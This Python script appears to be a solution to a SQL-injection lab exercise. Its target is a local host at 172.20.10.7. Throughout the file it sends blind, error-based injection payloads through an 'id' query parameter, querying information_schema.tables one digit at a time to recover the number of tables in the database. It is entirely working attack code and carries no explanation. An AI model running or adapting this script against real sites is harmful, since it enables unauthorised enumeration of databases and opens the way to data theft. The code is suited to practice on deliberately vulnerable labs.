import http.client

def SEND_PACKET(SQL):
    RESULT = '-'
    conn=http.client.HTTPConnection('172.20.10.7')
    conn.request("GET","/sqlinjection/example7/?id=%s" % SQL)
    r1=conn.getresponse()
    DATA=r1.read()
    try:
        if r1.status == 200:
            if 'Mysql2'.encode('utf-8') in DATA:
                RESULT = 'SUCCESS'
    except Exception as e:
        RESULT = 'FAIL'
        print(str(e))
    return RESULT         
            


def GET_MAX_COUNT_DIGIT():
	MAX_COUNT_DIGIT = 1
	while True:
		RESULT = ''
		SQL="(SELECT%201%20FROM%20information_schema.tables%20WHERE%20length((select%20count(table_name)%20from%20information_schema.tables%20limit%200,1))="
		SQL=SQL+"%d)" % MAX_COUNT_DIGIT
		while True:
			RESULT = SEND_PACKET(SQL)
			if RESULT != 'FAIL':
				break
		if RESULT == 'SUCCESS':
			break
		MAX_COUNT_DIGIT += 1

	return MAX_COUNT_DIGIT

def GET_MAX_COUNT(MAX_COUNT_DIGIT):
    MAX_COUNT = ''
    for DIGIT_COUNT in range(1, MAX_COUNT_DIGIT+1):
        for ASCII_CODE in range(48, 58):
            RESULT = ''
            SQL = '(SELECT%201%20FROM%20information_schema.tables%20WHERE%20ascii(substr((SELECT%20count(distinct(table_name))%20FROM%20information_schema.tables%20LIMIT%200,1)'
            SQL = SQL+',%s,1))=' % DIGIT_COUNT
            SQL = SQL+'%d)' % ASCII_CODE
            while True:
                RESULT = SEND_PACKET(SQL)
                if RESULT != 'FAIL':
                    break
            if RESULT == 'SUCCESS':
                MAX_COUNT = '%s%s' % (MAX_COUNT, chr(ASCII_CODE))
                break
    return MAX_COUNT


MAX_COUNT_DIGIT = GET_MAX_COUNT_DIGIT()
print("Total table number digit :",MAX_COUNT_DIGIT)
MAX_COUNT = GET_MAX_COUNT(MAX_COUNT_DIGIT)
print("Total table number : ",MAX_COUNT)